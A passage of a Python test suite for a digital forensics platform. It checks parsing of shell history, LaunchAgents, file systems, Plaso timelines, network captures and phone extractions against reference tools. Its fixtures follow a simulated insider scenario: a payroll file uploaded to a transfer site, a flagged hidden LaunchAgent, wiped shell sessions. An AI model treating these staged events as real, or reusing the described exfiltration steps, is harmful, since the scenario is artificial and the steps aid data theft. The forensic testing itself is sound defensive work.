          j['status'] == 'COMPLETED' and r.json['package']['archive'] == 'TAR' and [x['os'] for x in pkg.get('roots', [])] == ['macos']
          and tz.get('zone') == M['zone'] and (comp.get('computer_name'), comp.get('os', {}).get('product_name'), comp.get('os', {}).get('build')) == (M['computer_name'], M['os'], M['build']),
          (j.get('error'), pkg.get('roots'), tz, comp.get('computer_name'), comp.get('os')))
    users = {u['username']: u for u in docs('USER_ACCOUNT', ev2)}
    zsh = [c for c in docs('SHELL_COMMAND', ev2)]
    check('macOS accounts from the local directory (system accounts left out; alice an admin), zsh history with times, the upload and the wiped sessions flagged',
          {k: v['uid'] for k, v in users.items()} == M['accounts'] and users['alice']['admin']
          and [c['command'] for c in sorted(zsh, key=lambda c: c['order'])] == M['zsh'] and all(c['time'] for c in zsh)
          and {c['command'] for c in zsh if c['flags']} == {M['zsh'][1], M['zsh'][2]}, (users, [(c['command'], c['flags']) for c in zsh]))
    hist = {b['url']: b for b in docs('BROWSER_HISTORY', ev2) if b.get('browser') == 'Safari'}
    dl = [b for b in docs('BROWSER_DOWNLOAD', ev2) if b.get('browser') == 'Safari']
    check('Safari: each address with its last visit (Mac absolute time made UTC), and the download',
          {u: iso(b['last_visit_time']).isoformat() for u, b in hist.items()} == M['history']
          and [(d['url'], iso(d['start_time']).isoformat()) for d in dl] == [(M['download']['url'], M['download']['start'])], (hist, dl))
    q = sorted(docs('QUARANTINE_EVENT', ev2), key=lambda x: x['time'])
    wifi = {w['ssid']: _dt(w['last_joined']).isoformat() for w in docs('WIFI_NETWORK', ev2)}
    agents = {j_['name']: j_ for j_ in docs('SCHEDULED_JOB', ev2)}
    check('quarantined downloads (Safari and a Mail attachment from dmitri), Wi-Fi networks joined (the competitor\'s guest network), the hidden LaunchAgent flagged',
          [{'time': _dt(x['time']).isoformat(), 'agent': x['agent'], 'url': x['url'], 'sender': x['sender']} for x in q] == M['quarantine']
          and wifi == M['wifi'] and agents['com.sync.helper']['command'] == M['agent']
          and any(f['code'] == 'SUSPICIOUS_COMMAND' for f in agents['com.sync.helper']['flags'])
          and not agents['com.google.keystone.user.agent']['flags'], (q, wifi, {k: (v['command'], v['flags']) for k, v in agents.items()}))
    check('another investigator sees none of it (404)', get(f'/api/forensics/unix?case_id={case}&type=SHELL_COMMAND', C['INV2']).status == 404)
    res = get(f'/api/forensics/unix?case_id={case}&type=SHELL_COMMAND&flagged=true', inv).json
    # alice's four on build-01, root's systemctl enable, and the two on the Mac ('crontab -l' only lists jobs).
    check('the Linux and macOS records are listed by type, flagged ones on request', res['total'] == 7 and all(x['flags'] for x in res['data']),
          [(x['user'], x['command']) for x in res.get('data', [])])
    s = get(f'/api/forensics/search?case_id={case}&q=payroll', inv).json
    check('keyword search finds the Linux and macOS records (the scp, the shred, the Mac upload, the file opened)', s['totals'].get('unix', 0) >= 4, s['totals'])
    C['LINUX_E'], C['MAC_E'] = ev, ev2


@section('12x More file systems: ext4, HFS+ and APFS (vs fls on the same images)')
def t_more_filesystems():
    inv = C['INVESTIGATOR']
    db = mongo()
    case = post('/api/cases', inv, {'name': 'File systems', 'priority': 'LOW'}).json['case_id']
    for name, image in (('ext4 (build-01)', LINUX_IMG), ('HFS+', sample('dfvfs', 'hfsplus.raw')), ('APFS', sample('dfvfs', 'apfs.raw'))):
        if not image or not Path(image).exists():
            note(name, 'image not available; skipped')
            continue
        ev = upload(inv, case, Path(image).read_bytes(), f'{name.split()[0]}.dd').json['evidence_id']
        j = _analyse(inv, ev, {'profile': 'quick'})
        fs = (db.analysis_facts.find_one({'evidence_id': ev}) or {}).get('fs_index', {}).get('filesystems') or []
        if name == 'APFS':
            apsb = sh('pstat', str(image)).stdout.decode()
            block = re.search(r'APSB Block Number:\s*(\d+)', apsb).group(1)
            truth = sh('fls', '-P', 'apfs', '-B', block, '-r', '-p', str(image)).stdout.decode()
        else:
            truth = sh('fls', '-r', '-p', str(image)).stdout.decode()
        want = {'/' + x.split(':\t', 1)[1] for x in truth.splitlines() if ':\t' in x and '*' not in x.split(':\t')[0] and not x.lower().startswith(('v/v', '-/'))}
        got = {x['path'] for x in db.fs_entries.find({'evidence_id': ev, 'deleted': False, 'is_virtual': False})}
        check(f'{name}: every allocated file and folder fls lists is indexed', j['status'] == 'COMPLETED' and want and want <= got,
              (j.get('error'), [f.get('filesystem_type') for f in fs], sorted(want - got)[:5]))
        if name == 'APFS':
            pw = db.fs_entries.find_one({'evidence_id': ev, 'path': '/passwords.txt'})
            import base64
            vid = pw['volume_id']
            pg = get(f"/api/forensics/evidence/{ev}/content?inode={pw['inode']}&offset=0&volume_id={urllib.parse.quote(vid)}", inv).json
            truth_bytes = sh('icat', '-P', 'apfs', '-B', block, str(image), pw['inode']).stdout
            check('APFS: the volume is p0/apfs<block>, and the file viewer reads a file as icat does',
                  vid == f'p0/apfs{block}' and base64.b64decode(pg.get('data_b64') or '') == truth_bytes[:4096] and truth_bytes, (vid, pg.get('size')))


@section('12y Plaso timelines (json_line and l2tcsv of the scenario disk made by the pinned Plaso image, vs the files and DFIP\'s own event logs)')
def t_plaso():
    import csv as csv_mod
    inv = C['INVESTIGATOR']
    db = mongo()
    if not PLASO_JSON.exists():
        note('Plaso', 'make-plaso-timeline.sh has not been run; skipped')
        return
    A, E = C['A'], C['E']
    path = f'/api/cases/{A}/timeline-imports'
    up = lambda token, name, data, ev=None: form('POST', path, token, {'evidence_id': ev} if ev else {}, name, data)
    check('importing needs ANALYSIS_RUN (viewer 403), case access (404), evidence of the case (400) and a Plaso file (400)',
          up(C['VIEWER'], 'x.jsonl', PLASO_JSON.read_bytes()).status == 403
          and form('POST', f'/api/cases/{A}/timeline-imports', C['INV2'], {}, 'x.jsonl', b'{}').status == 404
          and up(inv, 'x.jsonl', PLASO_JSON.read_bytes(), 'EVID-999').status == 400 and up(inv, 'notes.txt', b'hello\n').status == 400)
    rows = [json.loads(x) for x in PLASO_JSON.read_text(encoding='utf-8').splitlines() if x.strip()]
    timed = [x for x in rows if x.get('timestamp')]
    r = up(inv, PLASO_JSON.name, PLASO_JSON.read_bytes(), E)
    jb = wait_job(inv, r.json['job_id']) if r.status == 200 else {}
    imp = next((x for x in get(path, inv).json['data'] if x['import_id'] == r.json.get('import_id')), {})
    from collections import Counter
    parsers = Counter(x['parser'] for x in timed)
    check('json_line: every event with a time imported (those without counted), per parser as in the file; the file kept with its SHA-256',
          jb.get('status') == 'COMPLETED' and imp.get('events') == len(timed) and imp.get('events_without_time') == len(rows) - len(timed)
          and imp.get('parsers') == dict(parsers) and imp.get('sha256') == _sha(PLASO_JSON.read_bytes()), (jb.get('error'), imp, len(timed)))
    events = list(db.timeline_events.find({'import_id': r.json.get('import_id')}))
    by_line = {e['import_line']: e for e in events}
    in_file = {n: json.loads(x) for n, x in enumerate(PLASO_JSON.read_text(encoding='utf-8').splitlines(), 1) if x.strip()}
    sample_ok = all(n in by_line and by_line[n]['timestamp'].replace(tzinfo=timezone.utc) == datetime(1970, 1, 1, tzinfo=timezone.utc)
                    + timedelta(milliseconds=d['timestamp'] // 1000) and by_line[n]['parser'] == d['parser']  # MongoDB keeps milliseconds
                    for n, d in in_file.items() if d.get('timestamp'))
    tl = get(f'/api/forensics/timeline?case_id={A}&type=PLASO_EVENT&limit=1', inv).json
    check('each imported event keeps Plaso\'s time, parser and description, and is on the case timeline as PLASO_EVENT',
          sample_ok and tl['total'] == len(timed) and all(e['parser'] and e['description'] for e in events), (tl.get('total'), events[:1]))
    # Cross-check: Plaso and DFIP read the same event log records at the same times (EVTX keeps UTC FILETIMEs).
    plaso_evtx = {(x.get('record_number'), datetime(1970, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=x['timestamp']))
                  for x in timed if x['parser'] == 'winevtx' and x.get('timestamp_desc') == 'Creation Time'}
    dfip_evtx = {(x['record_id'], x['time'].replace(tzinfo=timezone.utc)) for x in db.event_records.find({'evidence_id': E}, {'record_id': 1, 'time': 1})}
    check('Plaso\'s event log records are DFIP\'s own, record for record, at the same times', plaso_evtx and plaso_evtx <= dfip_evtx,
          (len(plaso_evtx), sorted(plaso_evtx - dfip_evtx)[:3]))
    fat = next((x for x in timed if x['parser'] == 'filestat' and (x.get('display_name') or '').endswith('project-notes.txt')
                and x['timestamp_desc'] == 'Content Modification Time'), None)
    if fat:
        note('Plaso and FAT times', f"Plaso reads project-notes.txt as modified "
             f"{datetime(1970, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=fat['timestamp'])}; the file was modified 2026-08-28 16:04:10 UTC "
             '(the generator and the Sleuth Kit agree): this Plaso version reads FAT dates a month late and without the computer\'s time zone')
    # l2tcsv: MACB rows (one row can stand for several times of an event).
    with PLASO_CSV.open(encoding='utf-8', newline='') as f:
        csv_rows = list(csv_mod.DictReader(f))
    csv_timed = [x for x in csv_rows if x['date'] != '00/00/0000']
    r2 = up(inv, PLASO_CSV.name, PLASO_CSV.read_bytes(), E)
    jb2 = wait_job(inv, r2.json['job_id']) if r2.status == 200 else {}
    imp2 = next((x for x in get(path, inv).json['data'] if x['import_id'] == r2.json.get('import_id')), {})
    check('l2tcsv: every row with a date imported, with its MACB letters', jb2.get('status') == 'COMPLETED' and imp2.get('events') == len(csv_timed)
          and db.timeline_events.count_documents({'import_id': imp2.get('import_id'), 'macb': {'$ne': None}}) == len(csv_timed), (jb2.get('error'), imp2.get('events'), len(csv_timed)))
    d = req('DELETE', f"{path}/{imp2['import_id']}", inv)
    check('deleting an import removes its events; imports and deletions are audited', d.status == 200 and d.json['events_removed'] == len(csv_timed)
          and not db.timeline_events.count_documents({'import_id': imp2['import_id']})
          and {a['action'] for a in db.audit_logs.find({'action': {'$in': ['TIMELINE_IMPORTED', 'TIMELINE_IMPORT_DELETED']}})} == {'TIMELINE_IMPORTED', 'TIMELINE_IMPORT_DELETED'}, d)
    C['PLASO_IMPORT'] = r.json.get('import_id')


CAPTURE, NET_EXPECTED = Path('/testdata/dfip-test-capture.pcap'), Path('/testdata/network-expected.json')
ANDROID_ZIP, IPHONE_ZIP = Path('/testdata/dfip-test-android.zip'), Path('/testdata/dfip-test-iphone.zip')
PHONES_EXPECTED = Path('/testdata/phones-expected.json')
HTTP_METHODS = (b'GET ', b'POST ', b'PUT ', b'HEAD ', b'DELETE ', b'OPTIONS ', b'PATCH ')
# The standard profile's modules that apply to a network capture (it has no file system).
CAPTURE_MODULES = ['network', 'media', 'executables', 'reputation', 'clamav', 'hash_match', 'yara']


def _u(v):
    d = iso(v) if isinstance(v, str) else v
    return d.replace(tzinfo=timezone.utc) if isinstance(d, datetime) and d.tzinfo is None else d


def _pcap_truth(path):
    """A capture read by dpkt, independently of tshark: packets and their span, DNS questions, HTTP request lines, TLS
    server names, and conversations (protocol and both ends) with their packets."""
    import socket
    import dpkt
    t = {'packets': 0, 'first': None, 'last': None, 'dns': {}, 'http': [], 'sni': [], 'convs': {}}
    with open(path, 'rb') as f:
        head = f.read(4)
        f.seek(0)
        rd = dpkt.pcapng.Reader(f) if head == b'\x0a\x0d\x0d\x0a' else dpkt.pcap.Reader(f)
        for ts, buf in rd:
            t['packets'] += 1
            t['first'] = ts if t['first'] is None else min(t['first'], ts)
            t['last'] = ts if t['last'] is None else max(t['last'], ts)
            try:
                ip = dpkt.ethernet.Ethernet(buf).data
            except Exception:
                continue
            if isinstance(ip, dpkt.ip.IP):
                fam, p = socket.AF_INET, ip.p
            elif isinstance(ip, dpkt.ip6.IP6):
                fam, p = socket.AF_INET6, ip.nxt
            else:
                continue
            src, dst, l4 = socket.inet_ntop(fam, ip.src), socket.inet_ntop(fam, ip.dst), ip.data
            proto = {6: 'TCP', 17: 'UDP'}.get(p, 'IP')
            ports = (str(l4.sport), str(l4.dport)) if proto != 'IP' else ('', '')
            a, b = (src, ports[0]), (dst, ports[1])
            key = (proto,) + ((a, b) if a <= b else (b, a))
            t['convs'][key] = t['convs'].get(key, 0) + 1
            if proto == 'UDP' and 53 in (l4.sport, l4.dport):
                try:
                    d = dpkt.dns.DNS(l4.data)
                except Exception:
                    continue
                if d.qr == dpkt.dns.DNS_Q and d.qd:
                    t['dns'][d.qd[0].name] = t['dns'].get(d.qd[0].name, 0) + 1
            elif proto == 'TCP' and l4.data:
                data = bytes(l4.data)
                if data.startswith(HTTP_METHODS):
                    lines = data.split(b'\r\n')
                    method, uri = lines[0].decode('latin-1').split(' ')[:2]
                    host = next((h.split(b':', 1)[1].strip().decode('latin-1') for h in lines[1:] if h.lower().startswith(b'host:')), None)
                    t['http'].append((method, host, uri))
                elif data[:1] == b'\x16' and len(data) > 5 and data[5] == 1:
                    for rec in dpkt.ssl.tls_multi_factory(data)[0]:
                        hs = dpkt.ssl.TLSHandshake(rec.data)
                        if hs.type == 1:
                            t['sni'] += [ed[5:5 + int.from_bytes(ed[3:5], 'big')].decode() for et, ed in hs.data.extensions if et == 0]
    return t


def _member_bytes(entry_id, token):
    """A member's bytes, read through the paged content endpoint (raw serves only pictures and PDFs)."""
    out, start = b'', 0
    while True:
        r = get(f'/api/forensics/members/{entry_id}/content?start={start}&length=1048576', token)
        if r.status != 200:
            return None
        out += base64.b64decode(r.json['data_b64'])
        start += r.json['length']
        if r.json['eof'] or not r.json['length']:
            return out


def _conv_key(c):
    a, b = (c['client'], str(c['client_port'] if c['client_port'] is not None else '')), (c['server'], str(c['server_port'] if c['server_port'] is not None else ''))
    return (c['protocol'],) + ((a, b) if a <= b else (b, a))


@section('12z Network captures (the scenario capture vs the generator and dpkt, and Plaso\'s test.pcap vs dpkt)')
def t_network():
    from collections import Counter
    inv = C['INVESTIGATOR']
    db = mongo()
    if not CAPTURE.exists() or not NET_EXPECTED.exists():
        note('Network captures', 'make-test-image.sh has not made them; skipped')
        return
    want = json.loads(NET_EXPECTED.read_text())
    truth = _pcap_truth(CAPTURE)
    case = C['NET_CASE'] = post('/api/cases', inv, {'name': 'Network capture', 'priority': 'LOW'}).json['case_id']
    r = upload(inv, case, CAPTURE.read_bytes(), CAPTURE.name)
    ev = r.json['evidence_id']
    j = _analyse(inv, ev, {'profile': 'standard'})
    s = (j.get('result') or {}).get('summary') or {}
    check('a pcap is taken as a network capture; only the modules that apply to one run (it has no file system)',
          r.status == 200 and r.json.get('format') == 'PCAP' and j['status'] == 'COMPLETED' and s.get('plan') == CAPTURE_MODULES
          and 'fs_index' in (s.get('not_applicable') or []), (r.status, r.json.get('format'), j.get('error'), s.get('plan'), s.get('not_applicable')))
    net = lambda t, extra='': get(f'/api/forensics/network?case_id={case}&type={t}&limit=1000{extra}', inv).json
    ci = (net('CAPTURE_INFO')['data'] or [{}])[0]
    check("the capture's packets, first and last packet equal the generator's and dpkt's",
          ci.get('packets') == want['packets'] == truth['packets'] and _u(ci['first']) == iso(want['first']) and _u(ci['last']) == iso(want['last'])
          and abs(_u(ci['first']).timestamp() - truth['first']) < 0.001 and abs(_u(ci['last']).timestamp() - truth['last']) < 0.001
          and 'pcap' in (ci.get('file_type') or '').lower(), (ci, truth['packets'], truth['first'], truth['last']))
    dns = net('DNS_QUERY')['data']
    check('DNS lookups: each name with its time and answer (the generator), as many as dpkt reads',
          [(d['name'], _u(d['time']), d['answers']) for d in dns] == [(x['name'], iso(x['time']), [x['answer']]) for x in want['dns']]
          and Counter(d['name'] for d in dns) == truth['dns'], (dns, truth['dns']))
    http = net('HTTP_REQUEST')['data']
    check('HTTP requests: method, host, path and time (the generator), the same request lines as dpkt, each with its response',
          [(h['method'], h['host'], h['uri'], _u(h['time'])) for h in http] == [(x['method'], x['host'], x['uri'], iso(x['time'])) for x in want['http']]
          and sorted((h['method'], h['host'], h['uri']) for h in http) == sorted(truth['http']) and all(h.get('response_code') == 200 for h in http),
          ([(h['method'], h['host'], h['uri'], h['time'], h.get('response_code')) for h in http], truth['http']))
    upload_ = next((h for h in http if h['method'] == 'POST'), {})
    sent = [f for f in upload_.get('files') or [] if f['direction'] == 'request' and f['part']]
    got = [f for h in http if h['method'] == 'GET' for f in h.get('files') or [] if f['direction'] == 'response']
    check('the upload: payroll-export.csv sent in the form post, with the SHA-256 of the file on the laptop; the logo received',
          [(f['name'], f['sha256']) for f in sent] == [('payroll-export.csv', want['payroll_sha256'])] and [f['sha256'] for f in got] == [want['png_sha256']],
          (upload_.get('files'), got))
    tls = net('TLS_HANDSHAKE')['data']
    check('TLS: the server name the client asked for (pastebin.com), as dpkt reads it',
          [(h['server_name'], h['server'], h['server_port']) for h in tls] == [(x['server_name'], x['ip'], x['port']) for x in want['sni']]
          and [h['server_name'] for h in tls] == truth['sni'], (tls, truth['sni']))
    convs = net('NET_CONVERSATION')['data']
    names = {c['server']: c.get('server_names') for c in convs}
    check('conversations: the same ends and packets as dpkt, the laptop as the client, servers named from DNS, TLS and HTTP',
          {_conv_key(c): c['packets'] for c in convs} == truth['convs']
          and {(c['protocol'], c['client'], c['server']) for c in convs} == {(x['proto'], x['a'], x['b']) for x in want['conversations']}
          and names.get('203.0.113.80') == ['filetransfer.example.net'] and names.get('203.0.113.81') == ['pastebin.com'], (convs, truth['convs']))
    files = get(f'/api/forensics/network/files?case_id={case}', inv).json['data']
    pay = next((f for f in files if f['name'] == 'payroll-export.csv'), None)
    raw = _member_bytes(pay['_id'], inv) if pay else None
    check('the files HTTP carried are members of the capture: the uploaded file opens with its own bytes, typed as text',
          pay is not None and raw is not None and hashlib.sha256(raw).hexdigest() == want['payroll_sha256']
          and pay['sha256'] == want['payroll_sha256'] and (pay.get('mime') or '').startswith('text/') and pay['container']['note'] == 'uploaded file',
          (pay, raw is not None))
    tl = get(f'/api/forensics/timeline?case_id={case}&type=HTTP_REQUEST,DNS_QUERY,TLS_HANDSHAKE&limit=100', inv).json['data']
    check('the timeline has the lookups, the requests (the upload named) and the TLS connection',
          Counter(e['type'] for e in tl) == {'DNS_QUERY': len(dns), 'HTTP_REQUEST': len(http), 'TLS_HANDSHAKE': len(tls)}
          and any('POST' in e['description'] and 'payroll-export.csv' in e['description'] for e in tl), [e['description'] for e in tl])
    check('disk-only views refuse a capture (409)', get(f'/api/forensics/evidence/{ev}/partitions', inv).status == 409)
    o = get(f'/api/cases/{case}/overview', inv).json['counts']
    exp = {'captures': 1, 'http_requests': len(http), 'dns_queries': len(dns), 'tls_handshakes': len(tls), 'net_conversations': len(convs),
           'capture_files': get(f'/api/forensics/network/files?case_id={case}&limit=1', inv).json['total'], 'http_uploads': net('HTTP_REQUEST', '&uploads=true')['total']}
    check('the overview counts equal the lists (one upload)', {k: o.get(k) for k in exp} == exp and exp['http_uploads'] == 1, ({k: o.get(k) for k in exp}, exp))
    s_ = get(f'/api/forensics/search?case_id={case}&q=filetransfer', inv).json
    check('keyword search finds the lookups and requests', s_['totals'].get('network', 0) >= len(dns) and s_['totals'].get('network', 0) >= 3, s_['totals'])
    check('another investigator sees none of it (404); the files list checks the evidence belongs to the case',
          get(f'/api/forensics/network?case_id={case}&type=HTTP_REQUEST', C['INV2']).status == 404
          and get(f'/api/forensics/network/files?case_id={case}', C['INV2']).status == 404
          and get(f'/api/forensics/network/files?case_id={case}&evidence_id={C["E"]}', inv).json['total'] == 0)
    check('a viewer cannot look a host up with threat intelligence (403); an investigator can',
          post(f'/api/threat-intel/domain/filetransfer.example.net?case_id={case}', C['VIEWER']).status == 403
          and post(f'/api/threat-intel/domain/filetransfer.example.net?case_id={case}', inv).status == 200)
    t = post('/api/tags', inv, {'case_id': case, 'item_type': 'NETWORK', 'item_id': upload_['_id'], 'label': 'EVIDENCE'})
    j = _analyse(inv, ev, {'modules': ['network']})
    after = get(f'/api/tags?case_id={case}', inv).json['data']
    check('a tagged request survives a re-analysis (re-linked by its natural key)',
          t.status == 200 and t.json['snapshot']['title'].startswith('POST http://filetransfer.example.net/upload') and j['status'] == 'COMPLETED'
          and len(after) == 1 and after[0]['resolved'] and after[0]['item_id'] != upload_['_id'], (t, after))
    rep = post(f'/api/reports?case_id={case}', inv)
    pdf = OUT / 'report-network.pdf'
    if rep.status == 200:
        pdf.write_bytes(get(f"/api/reports/{rep.json['report_id']}/download", inv).body)
    text = ' '.join(sh('pdftotext', '-layout', str(pdf), '-').stdout.decode(errors='replace').split()) if pdf.exists() else ''
    check("the report's Network captures section lists the capture, the upload with the file it sent, the lookups and the TLS server",
          rep.status == 200 and all(x in text for x in ('POST http://filetransfer.example.net/upload', 'sent payroll-export.csv', 'pastebin.com', '203.0.113.81',
                                                         f'{want["packets"]}')), (rep.status, text[text.find('Network captures'):][:600]))

    # A real capture: Plaso's test.pcap, checked against dpkt.
    pcap = sample('plaso', 'test.pcap')
    if not pcap:
        note("Plaso's test.pcap", 'sample unavailable (fetch-samples.sh); skipped')
        return
    t2 = _pcap_truth(pcap)
    ev2 = upload(inv, case, pcap.read_bytes(), 'test.pcap').json['evidence_id']
    j = _analyse(inv, ev2, {'profile': 'quick'})
    q = lambda t: list(db.forensic_artifacts.find({'evidence_id': ev2, 'type': t}))
    ci = (q('CAPTURE_INFO') or [{}])[0]
    check("Plaso's test.pcap (a real capture): the quick profile runs only the network module; packets, first and last packet as dpkt reads them",
          j['status'] == 'COMPLETED' and j['result']['summary']['plan'] == ['network'] and ci.get('packets') == t2['packets']
          and abs(_dt(ci['first']).timestamp() - t2['first']) < 0.001 and abs(_dt(ci['last']).timestamp() - t2['last']) < 0.001,
          (j.get('error'), ci.get('packets'), t2['packets']))
    check("test.pcap: every DNS question dpkt reads, as often; the same HTTP request lines; the same TLS server names",
          Counter(d['name'] for d in q('DNS_QUERY')) == t2['dns'] and sorted((h['method'], h['host'], h['uri']) for h in q('HTTP_REQUEST')) == sorted(t2['http'])
          and sorted(h['server_name'] for h in q('TLS_HANDSHAKE') if h['server_name']) == sorted(t2['sni']),
          (len(t2['dns']), len(t2['http']), t2['sni']))
    convs2 = q('NET_CONVERSATION')
    check('test.pcap: the same conversations as dpkt, with the same packets each', {_conv_key(c): c['packets'] for c in convs2} == t2['convs'],
          (len(convs2), len(t2['convs'])))
    bodies = list(db.fs_entries.find({'evidence_id': ev2, 'container.kind': 'capture'}))
    served = [_member_bytes(str(b['_id']), inv) for b in bodies]
    check('test.pcap: the bodies HTTP carried are kept, each served with the bytes its SHA-256 was taken of',
          len(bodies) > 0 and all(x is not None and hashlib.sha256(x).hexdigest() == b['sha256'] for x, b in zip(served, bodies)),
          [(b['path'], x is not None) for x, b in zip(served, bodies)][:5])


@section('12z2 Phones (an Android and an iPhone full file system extraction vs the generator)')
def t_phones():
    inv = C['INVESTIGATOR']
    db = mongo()
    if not (ANDROID_ZIP.exists() and IPHONE_ZIP.exists() and PHONES_EXPECTED.exists()):
        note('Phones', 'make-test-image.sh has not made them; skipped')
        return
    want = json.loads(PHONES_EXPECTED.read_text())
    A_, I_ = want['android'], want['iphone']
    case = C['PHONE_CASE'] = post('/api/cases', inv, {'name': 'Phones', 'priority': 'LOW'}).json['case_id']
    ea = upload(inv, case, ANDROID_ZIP.read_bytes(), ANDROID_ZIP.name).json['evidence_id']
    j = _analyse(inv, ea, {'profile': 'standard'})
    docs = lambda t, eid=ea: list(db.forensic_artifacts.find({'evidence_id': eid, 'type': t}))
    when = lambda x: _dt(x['time']).isoformat()
    pkg = db.evidence.find_one({'evidence_id': ea}).get('package') or {}
    dev = (docs('PHONE_DEVICE') or [{}])[0]
    tz = (db.analysis_facts.find_one({'evidence_id': ea}) or {}).get('tz_probe') or {}
    D = A_['device']
    check('Android: the root found as a phone; maker, model and version (build.prop), name (settings in Android binary XML), time zone (persistent properties)',
          j['status'] == 'COMPLETED' and [r['os'] for r in pkg.get('roots', [])] == ['android']
          and (dev.get('manufacturer'), dev.get('model'), dev.get('os_version'), dev.get('name'), dev.get('time_zone')) == (D['manufacturer'], D['model'], D['os_version'], D['name'], D['zone'])
          and (tz.get('zone'), tz.get('source')) == (D['zone'], 'system'), (j.get('error'), pkg.get('roots'), dev, tz))
    msgs = sorted(docs('PHONE_MESSAGE'), key=lambda m: _dt(m['time']))
    sms = [m for m in msgs if m['app'] == 'SMS']
    check('SMS: each message with its time, number, direction and text; the other side named from the contacts',
          [{'time': when(m), 'party': m['party'], 'direction': m['direction'], 'text': m['text']} for m in sms] == A_['sms']
          and {m['party']: m['party_name'] for m in sms} == {'+12125550147': 'Mom', '+442079460958': 'Dmitri K'}, sms)
    mms = [m for m in msgs if m['app'] == 'MMS']
    att = ((mms[0].get('attachments') if mms else None) or [{}])[0]
    pic = db.fs_entries.find_one({'evidence_id': ea, 'path': A_['mms']['attachment_path']}) or {}
    M_ = A_['mms']
    check('MMS: the text and the picture, linked to the file in the extraction (with the SHA-256 it was generated with)',
          len(mms) == 1 and (when(mms[0]), mms[0]['party'], mms[0]['direction'], mms[0]['text']) == (M_['time'], M_['party'], M_['direction'], M_['text'])
          and att.get('name') == M_['attachment'] and (att.get('file') or {}).get('path') == M_['attachment_path'] and pic.get('sha256') == M_['attachment_sha256'],
          (mms, pic.get('sha256')))
    f = att.get('file') or {}
    pv = get(f"/api/forensics/evidence/{ea}/preview?inode={urllib.parse.quote(f.get('inode') or '', safe='')}&offset=0&volume_id={f.get('volume_id')}", inv)
    lst = get(f'/api/forensics/evidence/{ea}/files?volume_id=pkg&limit=1', inv)
    check('the picture opens in the file viewer by its package path and volume (pkg); the file list takes the volume too',
          pv.status == 200 and pv.json.get('kind') == 'image' and lst.status == 200 and lst.json['total'] > 0
          and get(f"/api/forensics/evidence/{ea}/preview?inode={urllib.parse.quote(f.get('inode') or '', safe='')}&volume_id=pkg-z", inv).status == 404,
          (pv, lst.status))
    wa = [m for m in msgs if m['app'] == 'WhatsApp']
    check('WhatsApp (msgstore.db): the download link sent to dmitri and his answer, named from the contacts',
          [{'time': when(m), 'direction': m['direction'], 'text': m['text'], 'party': m['party']} for m in wa] == A_['whatsapp']
          and all(m['party_name'] == 'Dmitri K' for m in wa), wa)
    calls = sorted(docs('PHONE_CALL'), key=lambda c: _dt(c['time']))
    check('calls: the outgoing call to dmitri (127 s) and the missed call from Bob',
          [{'time': when(c), 'party': c['party'], 'direction': c['direction'], 'duration': c['duration']} for c in calls] == A_['calls']
          and [c['party_name'] for c in calls] == ['Dmitri K', 'Bob Builder'], calls)
    contacts = {c['name']: c['numbers'] + c['emails'] for c in docs('PHONE_CONTACT') if c['source'] == 'Contacts'}
    apps = docs('PHONE_APP')
    check('contacts with numbers and addresses; the apps the user installed (packages.xml in binary XML) with their install times, '
          'Signal and Proton Mail flagged, the system app left out',
          contacts == A_['contacts'] and {a['app_id']: _dt(a['installed']).isoformat() for a in apps} == A_['apps']
          and sorted(a['app_id'] for a in apps if a['notable']) == ['ch.protonmail.android', 'org.thoughtcrime.securesms'] and dev.get('system_apps') == 1,
          (contacts, [(a['app_id'], a['installed'], a['notable']) for a in apps]))
    everything = json.dumps(list(db.forensic_artifacts.find({'evidence_id': ea}, {'_id': 0})), default=str)
    check("saved Wi-Fi networks (the competitor's guest network), never their passwords",
          sorted(w['ssid'] for w in docs('PHONE_WIFI')) == sorted(A_['wifi']) and 'not-a-real-key' not in everything, docs('PHONE_WIFI'))
    chrome = [b for b in docs('BROWSER_HISTORY') if b.get('browser') == 'Chrome']
    check('Chrome on Android: the visit to the download link', [b['url'] for b in chrome] == [A_['chrome']], chrome)

    # iPhone.
    ei = upload(inv, case, IPHONE_ZIP.read_bytes(), IPHONE_ZIP.name).json['evidence_id']
    j = _analyse(inv, ei, {'profile': 'standard'})
    pkg = db.evidence.find_one({'evidence_id': ei}).get('package') or {}
    dev = (docs('PHONE_DEVICE', ei) or [{}])[0]
    tz = (db.analysis_facts.find_one({'evidence_id': ei}) or {}).get('tz_probe') or {}
    D = I_['device']
    check('iPhone: the root found as an iPhone, not a Mac; name, version and time zone from its own records',
          j['status'] == 'COMPLETED' and [r['os'] for r in pkg.get('roots', [])] == ['ios']
          and (dev.get('name'), dev.get('os_version'), dev.get('time_zone')) == (D['name'], D['os_version'], D['zone']) and tz.get('zone') == D['zone']
          and not docs('COMPUTER_INFO', ei) and not docs('SHELL_COMMAND', ei), (j.get('error'), pkg.get('roots'), dev, tz))
    msgs = sorted(docs('PHONE_MESSAGE', ei), key=lambda m: _dt(m['time']))
    im = [m for m in msgs if m['app'] != 'WhatsApp']
    pic = next((a for m in im for a in m.get('attachments') or []), {})
    check("Messages (sms.db, nanosecond times): the SMS from Mom and the iMessages with dmitri's address, named from the contacts; "
          'the picture he sent linked to the file in the extraction',
          [{'time': when(m), 'party': m['party'], 'app': m['app'], 'direction': m['direction'], 'text': m['text']} for m in im] == I_['messages']
          and [m['party_name'] for m in im] == ['Mom', 'Dmitri K', 'Dmitri K'] and pic.get('name') == I_['attachment']
          and (pic.get('file') or {}).get('path') == I_['attachment_path'], im)
    wa = [m for m in msgs if m['app'] == 'WhatsApp']
    check('WhatsApp (ChatStorage.sqlite): the two messages about deleting the chats',
          [{'time': when(m), 'direction': m['direction'], 'text': m['text']} for m in wa] == I_['whatsapp'] and all(m['party_name'] == 'Dmitri K' for m in wa), wa)
    calls = docs('PHONE_CALL', ei)
    C_ = I_['call']
    check('CallHistory: the outgoing FaceTime audio call with dmitri, five minutes',
          [(when(c), c['party'], c['kind'], c['direction'], c['duration'], c['party_name']) for c in calls]
          == [(C_['time'], C_['party'], C_['kind'], C_['direction'], C_['duration'], 'Dmitri K')], calls)
    apps = docs('PHONE_APP', ei)
    safari = [b['url'] for b in docs('BROWSER_HISTORY', ei) if b.get('browser') == 'Safari']
    wifi = [(w['ssid'], _dt(w['last_joined']).isoformat()) for w in docs('PHONE_WIFI', ei)]
    check('contacts (AddressBook); apps with their versions (Info.plist), Signal and Proton Mail flagged; Safari history; Wi-Fi joined',
          {c['name']: c['numbers'] + c['emails'] for c in docs('PHONE_CONTACT', ei)} == I_['contacts']
